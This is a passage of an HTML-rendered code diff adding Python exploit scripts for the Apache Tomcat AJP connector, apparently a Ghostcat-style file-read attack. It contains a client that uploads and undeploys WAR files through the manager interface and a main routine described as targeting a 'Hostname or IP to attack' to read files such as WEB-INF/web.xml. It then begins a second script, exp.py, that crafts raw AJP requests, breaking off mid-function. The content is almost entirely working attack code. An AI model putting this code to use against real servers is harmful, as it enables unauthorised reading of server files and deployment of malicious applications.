+        <span class="hljs-keyword">with</span> open(filename, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f_input:
+            <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;/tmp/request&quot;</span>, <span class="hljs-string">&quot;w+b&quot;</span>) <span class="hljs-keyword">as</span> f:
+                s_form_header = <span class="hljs-string">&apos;------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name=&quot;deployWar&quot;; filename=&quot;%s&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&apos;</span> % os.path.basename(
+                    filename)
+                s_form_footer = <span class="hljs-string">&apos;\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n&apos;</span>
+                f.write(s_form_header)
+                f.write(f_input.read())
+                f.write(s_form_footer)
+
+        data_len = os.path.getsize(<span class="hljs-string">&quot;/tmp/request&quot;</span>)
+
+        headers = {
+            <span class="hljs-string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>: <span class="hljs-string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti&quot;</span>,
+            <span class="hljs-string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>: <span class="hljs-string">&quot;%d&quot;</span> % data_len,
+            <span class="hljs-string">&quot;SC_REQ_REFERER&quot;</span>: <span class="hljs-string">&quot;http://%s/manager/html/&quot;</span> % (self.target_host),
+            <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://%s&quot;</span> % (self.target_host),
+        }
+        <span class="hljs-keyword">if</span> obj_cookie <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
+            headers[<span class="hljs-string">&quot;SC_REQ_COOKIE&quot;</span>] = obj_cookie.group(<span class="hljs-string">&apos;cookie&apos;</span>)
+
+        attributes = [{<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;req_attribute&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: (<span class="hljs-string">&quot;JK_LB_ACTIVATION&quot;</span>, <span class="hljs-string">&quot;ACT&quot;</span>)},
+                      {<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;req_attribute&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: (<span class="hljs-string">&quot;AJP_REMOTE_PORT&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>)}]
+        <span class="hljs-keyword">if</span> old_version == <span class="hljs-keyword">False</span>:
+            attributes.append({<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;query_string&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: deploy_csrf_token})
+        old_apps = self.list_installed_applications(user, password, old_version)
+        r = self.perform_request(<span class="hljs-string">&quot;/manager/html/upload&quot;</span>, headers=headers, method=<span class="hljs-string">&quot;POST&quot;</span>, user=user, password=password,
+                                 attributes=attributes)
+
+        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;/tmp/request&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:
+            br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
+            br.send_and_receive(self.socket, self.stream)
+
+        r = AjpResponse.receive(self.stream)
+        <span class="hljs-keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:
+            logger.error(<span class="hljs-string">&apos;Upload failed&apos;</span>)
+
+        <span class="hljs-keyword">while</span> r.prefix_code != AjpResponse.END_RESPONSE:
+            r = AjpResponse.receive(self.stream)
+        logger.debug(<span class="hljs-string">&apos;Upload seems normal. Checking...&apos;</span>)
+        new_apps = self.list_installed_applications(user, password, old_version)
+        <span class="hljs-keyword">if</span> len(new_apps) == len(old_apps) + <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> new_apps[:<span class="hljs-number">-1</span>] == old_apps:
+            logger.info(<span class="hljs-string">&apos;Upload success!&apos;</span>)
+        <span class="hljs-keyword">else</span>:
+            logger.error(<span class="hljs-string">&apos;Upload failed&apos;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_error_page</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">return</span> self.perform_request(<span class="hljs-string">&quot;/blablablablabla&quot;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_version</span><span class="hljs-params">(self)</span>:</span>
+        hdrs, data = self.get_error_page()
+        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:
+            s = re.findall(<span class="hljs-string">&apos;(Apache Tomcat/[0-9\.]+) &apos;</span>, d.data)
+            <span class="hljs-keyword">if</span> len(s) &gt; <span class="hljs-number">0</span>:
+                <span class="hljs-keyword">return</span> s[<span class="hljs-number">0</span>]
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_csrf_token</span><span class="hljs-params">(self, user, password, old_version, headers={}, query=[])</span>:</span>
+        <span class="hljs-comment"># first we request the manager page to get the CSRF token</span>
+        hdrs, rdata = self.perform_request(<span class="hljs-string">&quot;/manager/html&quot;</span>, headers=headers, user=user, password=password)
+        deploy_csrf_token = re.findall(<span class="hljs-string">&apos;(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)&quot;&apos;</span>,
+                                       <span class="hljs-string">&quot;&quot;</span>.join([d.data <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> rdata]))
+        <span class="hljs-keyword">if</span> old_version == <span class="hljs-keyword">False</span>:
+            <span class="hljs-keyword">if</span> len(deploy_csrf_token) == <span class="hljs-number">0</span>:
+                logger.critical(<span class="hljs-string">&quot;Failed to get CSRF token. Check the credentials&quot;</span>)
+                <span class="hljs-keyword">return</span>
+
+            logger.debug(<span class="hljs-string">&apos;CSRF token = %s&apos;</span> % deploy_csrf_token[<span class="hljs-number">0</span>])
+        obj = re.match(<span class="hljs-string">&quot;(?P&lt;cookie&gt;JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly&quot;</span>,
+                       hdrs.response_headers.get(<span class="hljs-string">&apos;Set-Cookie&apos;</span>, <span class="hljs-string">&apos;&apos;</span>))
+        <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
+            <span class="hljs-keyword">return</span> deploy_csrf_token[<span class="hljs-number">0</span>], obj
+        <span class="hljs-keyword">return</span> deploy_csrf_token[<span class="hljs-number">0</span>], <span class="hljs-keyword">None</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list_installed_applications</span><span class="hljs-params">(self, user, password, old_version, headers={})</span>:</span>
+        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
+        headers = {
+            <span class="hljs-string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,
+            <span class="hljs-string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,
+            <span class="hljs-string">&quot;SC_REQ_REFERER&quot;</span>: <span class="hljs-string">&quot;http://%s/manager/html/&quot;</span> % (self.target_host),
+            <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://%s&quot;</span> % (self.target_host),
+        }
+        <span class="hljs-keyword">if</span> obj_cookie <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
+            headers[<span class="hljs-string">&quot;SC_REQ_COOKIE&quot;</span>] = obj_cookie.group(<span class="hljs-string">&apos;cookie&apos;</span>)
+
+        attributes = [{<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;req_attribute&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: (<span class="hljs-string">&quot;JK_LB_ACTIVATION&quot;</span>, <span class="hljs-string">&quot;ACT&quot;</span>)},
+                      {<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;req_attribute&quot;</span>,
+                       <span class="hljs-string">&quot;value&quot;</span>: (<span class="hljs-string">&quot;AJP_REMOTE_PORT&quot;</span>, <span class="hljs-string">&quot;{}&quot;</span>.format(self.socket.getsockname()[<span class="hljs-number">1</span>]))}]
+        <span class="hljs-keyword">if</span> old_version == <span class="hljs-keyword">False</span>:
+            attributes.append({
+                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;query_string&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;%s&quot;</span> % deploy_csrf_token})
+        hdrs, data = self.perform_request(<span class="hljs-string">&quot;/manager/html/&quot;</span>, headers=headers, method=<span class="hljs-string">&quot;GET&quot;</span>, user=user, password=password,
+                                          attributes=attributes)
+        found = []
+        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:
+            im = re.findall(<span class="hljs-string">&apos;/manager/html/expire\?path=([^&amp;]*)&amp;&apos;</span>, d.data)
+            <span class="hljs-keyword">for</span> app <span class="hljs-keyword">in</span> im:
+                found.append(unquote(app))
+        <span class="hljs-keyword">return</span> found
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">undeploy</span><span class="hljs-params">(self, path, user, password, old_version, headers={})</span>:</span>
+        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)
+        path_app = <span class="hljs-string">&quot;path=%s&quot;</span> % path
+        headers = {
+            <span class="hljs-string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,
+            <span class="hljs-string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,
+            <span class="hljs-string">&quot;SC_REQ_REFERER&quot;</span>: <span class="hljs-string">&quot;http://%s/manager/html/&quot;</span> % (self.target_host),
+            <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://%s&quot;</span> % (self.target_host),
+        }
+        <span class="hljs-keyword">if</span> obj_cookie <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
+            headers[<span class="hljs-string">&quot;SC_REQ_COOKIE&quot;</span>] = obj_cookie.group(<span class="hljs-string">&apos;cookie&apos;</span>)
+
+        attributes = [{<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;req_attribute&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: (<span class="hljs-string">&quot;JK_LB_ACTIVATION&quot;</span>, <span class="hljs-string">&quot;ACT&quot;</span>)},
+                      {<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;req_attribute&quot;</span>,
+                       <span class="hljs-string">&quot;value&quot;</span>: (<span class="hljs-string">&quot;AJP_REMOTE_PORT&quot;</span>, <span class="hljs-string">&quot;{}&quot;</span>.format(self.socket.getsockname()[<span class="hljs-number">1</span>]))}]
+        <span class="hljs-keyword">if</span> old_version == <span class="hljs-keyword">False</span>:
+            attributes.append({
+                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;query_string&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;%s&amp;%s&quot;</span> % (path_app, deploy_csrf_token)})
+        r = self.perform_request(<span class="hljs-string">&quot;/manager/html/undeploy&quot;</span>, headers=headers, method=<span class="hljs-string">&quot;POST&quot;</span>, user=user, password=password,
+                                 attributes=attributes)
+        r = AjpResponse.receive(self.stream)
+        <span class="hljs-keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:
+            logger.error(<span class="hljs-string">&apos;Undeploy failed&apos;</span>)
+
+        <span class="hljs-comment"># Check the successful message</span>
+        found = <span class="hljs-keyword">False</span>
+        regex = <span class="hljs-string">r&apos;&lt;small&gt;&lt;strong&gt;Message:&lt;\/strong&gt;&lt;\/small&gt;&amp;nbsp;&lt;\/td&gt;\s*&lt;td class=&quot;row-left&quot;&gt;&lt;pre&gt;(OK - .*&apos;</span> + path + <span class="hljs-string">&apos;)\s*&lt;\/pre&gt;&lt;\/td&gt;&apos;</span>
+        <span class="hljs-keyword">while</span> r.prefix_code != AjpResponse.END_RESPONSE:
+            r = AjpResponse.receive(self.stream)
+            <span class="hljs-keyword">if</span> r.prefix_code == <span class="hljs-number">3</span>:
+                f = re.findall(regex, r.data)
+                <span class="hljs-keyword">if</span> len(f) &gt; <span class="hljs-number">0</span>:
+                    found = <span class="hljs-keyword">True</span>
+        <span class="hljs-keyword">if</span> found:
+            logger.info(<span class="hljs-string">&apos;Undeploy succeed&apos;</span>)
+        <span class="hljs-keyword">else</span>:
+            logger.error(<span class="hljs-string">&apos;Undeploy failed&apos;</span>)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument(<span class="hljs-string">&apos;target&apos;</span>, type=str, help=<span class="hljs-string">&quot;Hostname or IP to attack&quot;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;-p&apos;</span>, <span class="hljs-string">&apos;--port&apos;</span>, type=int, default=<span class="hljs-number">8009</span>, help=<span class="hljs-string">&quot;AJP port to attack (default is 8009)&quot;</span>)
+    parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&apos;--file&apos;</span>, type=str, default=<span class="hljs-string">&apos;WEB-INF/web.xml&apos;</span>, help=<span class="hljs-string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)
+    args = parser.parse_args()
+    bf = Tomcat(args.target, args.port)
+    attributes = [
+        {<span class="hljs-string">&apos;name&apos;</span>: <span class="hljs-string">&apos;req_attribute&apos;</span>, <span class="hljs-string">&apos;value&apos;</span>: [<span class="hljs-string">&apos;javax.servlet.include.request_uri&apos;</span>, <span class="hljs-string">&apos;/&apos;</span>]},
+        {<span class="hljs-string">&apos;name&apos;</span>: <span class="hljs-string">&apos;req_attribute&apos;</span>, <span class="hljs-string">&apos;value&apos;</span>: [<span class="hljs-string">&apos;javax.servlet.include.path_info&apos;</span>, args.file]},
+        {<span class="hljs-string">&apos;name&apos;</span>: <span class="hljs-string">&apos;req_attribute&apos;</span>, <span class="hljs-string">&apos;value&apos;</span>: [<span class="hljs-string">&apos;javax.servlet.include.servlet_path&apos;</span>, <span class="hljs-string">&apos;/&apos;</span>]},
+    ]
+    snd_hdrs_res, data_res = bf.perform_request(req_uri=<span class="hljs-string">&apos;/&apos;</span>,method=<span class="hljs-string">&apos;GET&apos;</span>, attributes=attributes)
+    print(<span class="hljs-string">&quot;&quot;</span>.join([d.data <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_res]))
+</code></pre>
+<div><p class="code-filename">exp.py</p></div>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-comment"># Author: 00theway</span>
+
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> binascii
+<span class="hljs-keyword">import</span> argparse
+<span class="hljs-keyword">import</span> urllib.parse
+
+debug = <span class="hljs-keyword">False</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">log</span><span class="hljs-params">(type, *args, **kwargs)</span>:</span>
+    <span class="hljs-keyword">if</span> type == <span class="hljs-string">&apos;debug&apos;</span> <span class="hljs-keyword">and</span> debug == <span class="hljs-keyword">False</span>:
+        <span class="hljs-keyword">return</span>
+    <span class="hljs-keyword">elif</span> type == <span class="hljs-string">&apos;append&apos;</span> <span class="hljs-keyword">and</span> debug == <span class="hljs-keyword">True</span>:
+        <span class="hljs-keyword">return</span>
+    <span class="hljs-keyword">elif</span> type == <span class="hljs-string">&apos;append&apos;</span>:
+        kwargs[<span class="hljs-string">&apos;end&apos;</span>] = <span class="hljs-string">&apos;&apos;</span>
+        print(*args, **kwargs)
+        <span class="hljs-keyword">return</span>
+    print(<span class="hljs-string">&apos;[%s]&apos;</span> % type.upper(), *args, **kwargs)
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ajpRequest</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, request_url, method=<span class="hljs-string">&apos;GET&apos;</span>, headers=[], attributes=[])</span>:</span>
+        self.request_url = request_url
+        self.method = method
+        self.headers = headers
+        self.attributes = attributes
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">method2code</span><span class="hljs-params">(self, method)</span>:</span>
+        methods = {
+            <span class="hljs-string">&apos;OPTIONS&apos;</span>: <span class="hljs-number">1</span>,
+            <span class="hljs-string">&apos;GET&apos;</span>: <span class="hljs-number">2</span>,
+            <span class="hljs-string">&apos;HEAD&apos;</span>: <span class="hljs-number">3</span>,
+            <span class="hljs-string">&apos;POST&apos;</span>: <span class="hljs-number">4</span>,
+            <span class="hljs-string">&apos;PUT&apos;</span>: <span class="hljs-number">5</span>,
+            <span class="hljs-string">&apos;DELETE&apos;</span>: <span class="hljs-number">6</span>,
+            <span class="hljs-string">&apos;TRACE&apos;</span>: <span class="hljs-number">7</span>,
+            <span class="hljs-string">&apos;PROPFIND&apos;</span>: <span class="hljs-number">8</span>
+        }
+        code = methods.get(method, <span class="hljs-number">2</span>)
+        <span class="hljs-keyword">return</span> code
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_headers</span><span class="hljs-params">(self)</span>:</span>
+        header2code = {
+            <span class="hljs-string">b&apos;accept&apos;</span>: <span class="hljs-string">b&apos;\xA0\x01&apos;</span>,  <span class="hljs-comment"># SC_REQ_ACCEPT</span>
+            <span class="hljs-string">b&apos;accept-charset&apos;</span>: <span class="hljs-string">b&apos;\xA0\x02&apos;</span>,  <span class="hljs-comment"># SC_REQ_ACCEPT_CHARSET</span>
+            <span class="hljs-string">b&apos;accept-encoding&apos;</span>: <span class="hljs-string">b&apos;\xA0\x03&apos;</span>,  <span class="hljs-comment"># SC_REQ_ACCEPT_ENCODING</span>
+            <span class="hljs-string">b&apos;accept-language&apos;</span>: <span class="hljs-string">b&apos;\xA0\x04&apos;</span>,  <span class="hljs-comment"># SC_REQ_ACCEPT_LANGUAGE</span>
+            <span class="hljs-string">b&apos;authorization&apos;</span>: <span class="hljs-string">b&apos;\xA0\x05&apos;</span>,  <span class="hljs-comment"># SC_REQ_AUTHORIZATION</span>
+            <span class="hljs-string">b&apos;connection&apos;</span>: <span class="hljs-string">b&apos;\xA0\x06&apos;</span>,  <span class="hljs-comment"># SC_REQ_CONNECTION</span>
+            <span class="hljs-string">b&apos;content-type&apos;</span>: <span class="hljs-string">b&apos;\xA0\x07&apos;</span>,  <span class="hljs-comment"># SC_REQ_CONTENT_TYPE</span>
+            <span class="hljs-string">b&apos;content-length&apos;</span>: <span class="hljs-string">b&apos;\xA0\x08&apos;</span>,  <span class="hljs-comment"># SC_REQ_CONTENT_LENGTH</span>
+            <span class="hljs-string">b&apos;cookie&apos;</span>: <span class="hljs-string">b&apos;\xA0\x09&apos;</span>,  <span class="hljs-comment"># SC_REQ_COOKIE</span>
+            <span class="hljs-string">b&apos;cookie2&apos;</span>: <span class="hljs-string">b&apos;\xA0\x0A&apos;</span>,  <span class="hljs-comment"># SC_REQ_COOKIE2</span>
+            <span class="hljs-string">b&apos;host&apos;</span>: <span class="hljs-string">b&apos;\xA0\x0B&apos;</span>,  <span class="hljs-comment"># SC_REQ_HOST</span>
+            <span class="hljs-string">b&apos;pragma&apos;</span>: <span class="hljs-string">b&apos;\xA0\x0C&apos;</span>,  <span class="hljs-comment"># SC_REQ_PRAGMA</span>
+            <span class="hljs-string">b&apos;referer&apos;</span>: <span class="hljs-string">b&apos;\xA0\x0D&apos;</span>,  <span class="hljs-comment"># SC_REQ_REFERER</span>
+            <span class="hljs-string">b&apos;user-agent&apos;</span>: <span class="hljs-string">b&apos;\xA0\x0E&apos;</span>  <span class="hljs-comment"># SC_REQ_USER_AGENT</span>
+        }
+        headers_ajp = []
+
+        <span class="hljs-keyword">for</span> (header_name, header_value) <span class="hljs-keyword">in</span> self.headers:
+            code = header2code.get(header_name, <span class="hljs-string">b&apos;&apos;</span>)
+            <span class="hljs-keyword">if</span> code != <span class="hljs-string">b&apos;&apos;</span>:
+                headers_ajp.append(code)
+                headers_ajp.append(self.ajp_string(header_value))
+            <span class="hljs-keyword">else</span>:
+                headers_ajp.append(self.ajp_string(header_name))
+                headers_ajp.append(self.ajp_string(header_value))
+
+        <span class="hljs-keyword">return</span> self.int2byte(len(self.headers), <span class="hljs-number">2</span>), <span class="hljs-string">b&apos;&apos;</span>.join(headers_ajp)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_attributes</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-string">&apos;&apos;&apos;
+        org.apache.catalina.jsp_file
+        javax.servlet.include.servlet_path + javax.servlet.include.path_info
+        &apos;&apos;&apos;</span>
+        attribute2code = {
+            <span class="hljs-string">b&apos;remote_user&apos;</span>: <span class="hljs-string">b&apos;\x03&apos;</span>,
+            <span class="hljs-string">b&apos;auth_type&apos;</span>: <span class="hljs-string">b&apos;\x04&apos;</span>,
+            <span class="hljs-string">b&apos;query_string&apos;</span>: <span class="hljs-string">b&apos;\x05&apos;</span>,
+            <span class="hljs-string">b&apos;jvm_route&apos;</span>: <span class="hljs-string">b&apos;\x06&apos;</span>,
+            <span class="hljs-string">b&apos;ssl_cert&apos;</span>: <span class="hljs-string">b&apos;\x07&apos;</span>,
+            <span class="hljs-string">b&apos;ssl_cipher&apos;</span>: <span class="hljs-string">b&apos;\x08&apos;</span>,
+            <span class="hljs-string">b&apos;ssl_session&apos;</span>: <span class="hljs-string">b&apos;\x09&apos;</span>,
+            <span class="hljs-string">b&apos;req_attribute&apos;</span>: <span class="hljs-string">b&apos;\x0A&apos;</span>,  <span class="hljs-comment"># Name (the name of the attribut follows)</span>
+            <span class="hljs-string">b&apos;ssl_key_size&apos;</span>: <span class="hljs-string">b&apos;\x0B&apos;</span>
+        }
+        attributes_ajp = []
+
+        <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> self.attributes:
+            code = attribute2code.get(name, <span class="hljs-string">b&apos;&apos;</span>)
+            <span class="hljs-keyword">if</span> code != <span class="hljs-string">b&apos;&apos;</span>:
+                attributes_ajp.append(code)
+                <span class="hljs-keyword">if</span> code == <span class="hljs-string">b&apos;\x0A&apos;</span>:
+                    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:
+                        attributes_ajp.append(self.ajp_string(v))
+                <span class="hljs-keyword">else</span>:
+                    attributes_ajp.append(self.ajp_string(value))
+
+        <span class="hljs-keyword">return</span> <span class="hljs-string">b&apos;&apos;</span>.join(attributes_ajp)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ajp_string</span><span class="hljs-params">(self, message_bytes)</span>:</span>
+        <span class="hljs-comment"># an AJP string</span>
+        <span class="hljs-comment"># the length of the string on two bytes + string + plus two null bytes</span>
+        message_len_int = len(message_bytes)
+        <span class="hljs-keyword">return</span> self.int2byte(message_len_int, <span class="hljs-number">2</span>) + message_bytes + <span class="hljs-string">b&apos;\x00&apos;</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">int2byte</span><span class="hljs-params">(self, data, byte_len=<span class="hljs-number">1</span>)</span>:</span>
+        <span class="hljs-keyword">return</span> data.to_bytes(byte_len, <span class="hljs-string">&apos;big&apos;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_forward_request_package</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-string">&apos;&apos;&apos;
+        AJP13_FORWARD_REQUEST :=
+            prefix_code      (byte) 0x02 = JK_AJP13_FORWARD_REQUEST
+            method           (byte)
+            protocol         (string)
+            req_uri          (string)
+            remote_addr      (string)
+            remote_host      (string)
+            server_name      (string)
+            server_port      (integer)
+            is_ssl           (boolean)
+            num_headers      (integer)
+            request_headers *(req_header_name req_header_value)
+            attributes      *(attribut_name attribute_value)
+            request_terminator (byte) OxFF
+        &apos;&apos;&apos;</span>
+        req_ob = urllib.parse.urlparse(self.request_url)
+
+        <span class="hljs-comment"># JK_AJP13_FORWARD_REQUEST</span>
+        prefix_code_int = <span class="hljs-number">2</span>
+        prefix_code_bytes = self.int2byte(prefix_code_int)
+        method_bytes = self.int2byte(self.method2code(self.method))
+        protocol_bytes = <span class="hljs-string">b&apos;HTTP/1.1&apos;</span>
+        req_uri_bytes = req_ob.path.encode(<span class="hljs-string">&apos;utf8&apos;</span>)
+        remote_addr_bytes = <span class="hljs-string">b&apos;127.0.0.1&apos;</span>
+        remote_host_bytes = <span class="hljs-string">b&apos;localhost&apos;</span>
+        server_name_bytes = req_ob.hostname.encode(<span class="hljs-string">&apos;utf8&apos;</span>)
+
+        <span class="hljs-comment"># SSL flag</span>
+        <span class="hljs-keyword">if</span> req_ob.scheme == <span class="hljs-string">&apos;https&apos;</span>:
+            is_ssl_boolean = <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            is_ssl_boolean = <span class="hljs-number">0</span>
+
+        <span class="hljs-comment"># port</span>
+        server_port_int = req_ob.port
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> server_port_int:
+            server_port_int = (is_ssl_boolean ^ <span class="hljs-number">1</span>) * <span class="hljs-number">80</span> + (is_ssl_boolean ^ <span class="hljs-number">0</span>) * <span class="hljs-number">443</span>
+        server_port_bytes = self.int2byte(server_port_int, <span class="hljs-number">2</span>)  <span class="hljs-comment"># convert to a two bytes</span>
+
+        is_ssl_bytes = self.int2byte(is_ssl_boolean)  <span class="hljs-comment"># convert to a one byte</span>
+
+        self.headers.append((<span class="hljs-string">b&apos;host&apos;</span>, <span class="hljs-string">b&apos;%s:%d&apos;</span> % (server_name_bytes, server_port_int)))
+
+        num_headers_bytes, headers_ajp_bytes = self.make_headers()
+
+        attributes_ajp_bytes = self.make_attributes()
+
+        message = []
+        message.append(prefix_code_bytes)
+        message.append(method_bytes)
+        message.append(self.ajp_string(protocol_bytes))
+        message.append(self.ajp_string(req_uri_bytes))
+        message.append(self.ajp_string(remote_addr_bytes))
+        message.append(self.ajp_string(remote_host_bytes))
+        message.append(self.ajp_string(server_name_bytes))
+        message.append(server_port_bytes)
+        message.append(is_ssl_bytes)
+        message.append(num_headers_bytes)
+        message.append(headers_ajp_bytes)
+        message.append(attributes_ajp_bytes)
+        message.append(<span class="hljs-string">b&apos;\xff&apos;</span>)
+        message_bytes = <span class="hljs-string">b&apos;&apos;</span>.join(message)
+
+        send_bytes = <span class="hljs-string">b&apos;\x12\x34&apos;</span> + self.ajp_string(message_bytes)
+
+        <span class="hljs-keyword">return</span> send_bytes
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ajpResponse</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, s, out_file)</span>:</span>
+        self.sock = s
+        self.out_file = out_file
+        self.body_start = <span class="hljs-keyword">False</span>
+        self.common_response_headers = {
+            <span class="hljs-string">b&apos;\x01&apos;</span>: <span class="hljs-string">b&apos;Content-Type&apos;</span>,
+            <span class="hljs-string">b&apos;\x02&apos;</span>: <span class="hljs-string">b&apos;Content-Language&apos;</span>,
+            <span class="hljs-string">b&apos;\x03&apos;</span>: <span class="hljs-string">b&apos;Content-Length&apos;</span>,
+            <span class="hljs-string">b&apos;\x04&apos;</span>: <span class="hljs-string">b&apos;Date&apos;</span>,
+            <span class="hljs-string">b&apos;\x05&apos;</span>: <span class="hljs-string">b&apos;Last-Modified&apos;</span>,
+            <span class="hljs-string">b&apos;\x06&apos;</span>: <span class="hljs-string">b&apos;Location&apos;</span>,
+            <span class="hljs-string">b&apos;\x07&apos;</span>: <span class="hljs-string">b&apos;Set-Cookie&apos;</span>,
+            <span class="hljs-string">b&apos;\x08&apos;</span>: <span class="hljs-string">b&apos;Set-Cookie2&apos;</span>,
+            <span class="hljs-string">b&apos;\x09&apos;</span>: <span class="hljs-string">b&apos;Servlet-Engine&apos;</span>,
+            <span class="hljs-string">b&apos;\x0a&apos;</span>: <span class="hljs-string">b&apos;Status&apos;</span>,
+            <span class="hljs-string">b&apos;\x0b&apos;</span>: <span class="hljs-string">b&apos;WWW-Authenticate&apos;</span>,
+        }
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.out_file:
+            self.out_file = <span class="hljs-keyword">False</span>
+        <span class="hljs-keyword">else</span>:
+            log(<span class="hljs-string">&apos;*&apos;</span>, <span class="hljs-string">&apos;store response in %s&apos;</span> % self.out_file)
+            self.out = open(self.out_file, <span class="hljs-string">&apos;wb&apos;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_response</span><span class="hljs-params">(self)</span>:</span>
+        log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;start&apos;</span>)
+
+        magic = self.recv(<span class="hljs-number">2</span>)  <span class="hljs-comment"># first two bytes are the &apos;magic&apos;</span>
+        log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;magic&apos;</span>, magic, binascii.b2a_hex(magic))
+        <span class="hljs-comment"># next two bytes are the length</span>
+        data_len_int = self.read_int(<span class="hljs-number">2</span>)
+
+        code_int = self.read_int(<span class="hljs-number">1</span>)
+        log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;code&apos;</span>, code_int)
+
